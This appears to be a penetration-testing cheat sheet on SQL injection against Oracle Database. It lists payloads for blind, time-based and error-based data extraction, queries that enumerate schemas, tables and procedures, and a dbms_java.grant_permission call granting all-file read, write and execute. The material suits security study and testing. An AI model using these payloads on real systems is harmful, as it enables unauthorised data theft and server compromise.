# SQLi for [Oracle DB](https://www.oracle.com/database/)

## Things to remember
  *  [Oracle DB has a more complex architecture](https://docs.oracle.com/en/database/oracle/oracle-database/23/dbiad/db_dbserver.html)
  *  HackTricks has a [multiple](https://book.hacktricks.xyz/pentesting-web/sql-injection/oracle-injection) [pages](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener) covering Oracle
  *  **EVERYTHING** is case sensitive
      *  [`LOWER()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/LOWER.html)/[`UPPER()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/UPPER.html) to ensure matching cases during comparisons
  *  Boolean and time-based injections are versatile... get creative!

## Common errors
  *  `ORA-00904: invalid identifier` caused by string literals being wrapped in double quotes: use single
  *  `ORA-00907: missing right parenthesis` caused by injection point being wrapped in function calls
      *  Add closing parenthesis until wrapping function calls are complete

## DBMS instance details
  *  DBMS version, current user/schema, data directory, etc.
  *  Lots of other info available using [`sys_context()`](https://docs.oracle.com/cd/B14117_01/server.101/b10759/functions150.htm)
  *  Data directories used to [store Oracle stuff](https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_1050.htm#i1576965)
      *  Only shows directories of current schema/user

```
(SELECT LISTAGG(banner, ', ') from v$version)
(SELECT USER FROM DUAL)
(SELECT LISTAGG(DIRECTORY_PATH, ', ') FROM ALL_DIRECTORIES)
(SELECT sys_context('USERENV', 'DB_NAME') FROM DUAL)
```

## Boolean-based blind
  *  Infer DB contents from true/false responses
  *  A simple way to induce this type of response is to use `OR`/`AND` operators
      *  More complex ways could also exist depending on the application
  *  Oracle DB version `23c` introduced `boolean` [datatypes](https://docs.oracle.com/en/database/oracle/oracle-database/23/sqlrf/Data-Types.html)
      *  Older version? Try comparing `int`
  *  Encode case-sensitive strings to hex using [`RAWTOHEX()`](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/RAWTOHEX.html)

```
(SELECT TRUE FROM DUAL WHERE LOWER(USER) LIKE LOWER('%'))
(SELECT 1 FROM DUAL WHERE LOWER(USER) LIKE LOWER('%'))
(SELECT 1 FROM DUAL WHERE LOWER(RAWTOHEX(USER)) LIKE LOWER('%'))
(SELECT 1 WHERE ASCII(SUBSTR(LOWER(USER), 1, 1)) < 127)
```

## Time-based blind
  *  Infer DB contents by forcing the server to wait and measuring response times
  *  A simple way to induce this type of response is to use `OR`/`AND` operators
      *  More complex ways could also exist depending on the application
  *  There is no dedicated sleep function within Oracle DB
      *  Heavy queries can be used to induce a delay before DB response
      *  Increment number of table reads until consistent delay is achieved
      *  [Other methods exist](https://media.defcon.org/DEF%20CON%2016/DEF%20CON%2016%20presentations/DEF%20CON%2016%20-%20alonso-parada-wp.pdf) but some may require extra privileges
  *  Encode case-sensitive strings to hex using `RAWTOHEX()`

```
(SELECT CASE WHEN ((SELECT LOWER(USER)) LIKE LOWER('%')) THEN (SELECT COUNT(*) FROM ALL_USERS A, ALL_USERS B, ALL_USERS C, ALL_USERS D, ALL_USERS E, ALL_USERS F) ELSE NULL END FROM DUAL)
(SELECT CASE WHEN (ASCII(SUBSTR(LOWER(USER), 1, 1)) < 127) THEN (SELECT COUNT(*) FROM ALL_USERS A, ALL_USERS B, ALL_USERS C, ALL_USERS D, ALL_USERS E, ALL_USERS F) ELSE NULL END FROM DUAL)
```

## Error-based
  *  Cause an error that contains the result of a subquery
      *  Useful if errors are rendered on the page
  *  `OR`/`AND` operators useful to include error-causing functions
  *  [PayloadsAllTheThings has a section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-error-based) covering this
  *  [`CTXSYS.DRITHSX.SN()`](https://github.com/sqlmapproject/sqlmap/blob/2f01cbf71fcd48bb20f9394ff6f088211305277e/data/xml/payloads/error_based.xml#L629) function useful for intentionally causing errors
      *  The function example listed below is **NOT** used correctly... duh!

```
1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))
```

## Enumerate PDBs, schemas, tables, and columns
  *  List current or all PDBS
      *  Requires extra privileges
      *  [`LISTAGG()`](https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/LISTAGG.html) used to return single-value from subquery
      *  Must have privs to read [`DBA_PDBS`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/DBA_PDBS.html) table/view to dump all PDBS
  *  List current or all schemas
      *  Does **NOT** require extra privileges
      *  Since a schema is created for every user, you can just list users
  *  List all tables or all tables within a given schema
      *  [`USER_TABLES`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/USER_TABLES.html) for tables owned by current user
      *  [`ALL_TABLES`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html) for tables accessible by current user
      *  [`DBA_TABLES`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/DBA_TABLES.html) for all tables, requires extra privileges
  *  List all columns within a given table
      *  [`JSON_ARRAYAGG()`](https://docs.oracle.com/en/database/oracle/oracle-database/23/sqlrf/JSON_ARRAYAGG.html) used to return single-value from subquery

```
(SELECT sys_context('USERENV', 'DB_NAME') FROM DUAL)
(SELECT LISTAGG(pdb_name, ', ') FROM dba_pdbs)
(SELECT USER)
(SELECT LISTAGG(username, ', ') from ALL_USERS)
(SELECT LISTAGG(table_name, ', ') FROM USER_TABLES)
(SELECT LISTAGG(owner || '.' || table_name, ', ') FROM ALL_TABLES WHERE owner=UPPER('exampleSchema'))
(SELECT LISTAGG(owner || '.' || table_name, ', ') FROM DBA_TABLES)
(SELECT JSON_ARRAYAGG(COLUMN_NAME || ':' || DATA_TYPE) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=UPPER('exampleTable'))
```

## System interaction
  *  System interaction in Oracle DB is primarily achieved via [PL/SQL](https://www.oracle.com/database/technologies/appdev/plsql.html)
      *  PL/SQL cannot be invoked directly from `SELECT` or similar (no stacked queries)
      *  PL/SQL [stored procedures](https://docs.oracle.com/en/database/other-databases/timesten/22.1/plsql-developer/pl-sql-procedures-and-functions.html) can be vulnerable to [PL/SQL injection](https://www.sqlinjection.net/advanced/pl-sql/)
      *  A stored procedure must have a function to be injectable from a `SELECT` statement
  *  Enumerate procedures/functions and attempt to inject arbitrary PL/SQL
      *  [`USER_PROCEDURES`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/USER_PROCEDURES.html) for procedures/functions owned by current user
      *  [`ALL_PROCEDURES`](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_PROCEDURES.html) for procedures/functions accessible by current user
      *  [`DBA_PROCEDURES`](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/DBA_PROCEDURES.html) for all procedures/functions, requires extra privileges
  *  File read/write and command execution all rely on PL/SQL
      *  Oracle DB PL/SQL supports [compiling Java code into stored procedures](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#oracle)
      *  Leveraging Java for a reverse shell within PL/SQL can be difficult due to TTY issues
      *  If Java is not supported/installed [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/23/arpls/UTL_FILE.html#GUID-EBC42A36-EB72-4AA1-B75F-8CF4BC6E29B4) could be used for arbitrary file read
      *  Before files can be read/written/executed [`dbms_java.grant_permission`](https://docs.oracle.com/en/database/oracle/oracle-database/23/jjdev/DBMS-JAVA-package.html) must be invoked

```
(SELECT LISTAGG(object_name, ', ') FROM user_procedures)
(SELECT LISTAGG(owner || '.' || object_name, ', ') FROM all_procedures)
(SELECT LISTAGG(owner || '.' || object_name, ', ') FROM all_procedures WHERE OBJECT_TYPE = UPPER('PROCEDURE'))
(SELECT LISTAGG(owner || '.' || object_name, ', ') FROM dba_procedures WHERE OBJECT_TYPE = UPPER('PROCEDURE'))
dbms_java.grant_permission('exampleSchema', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute')
```
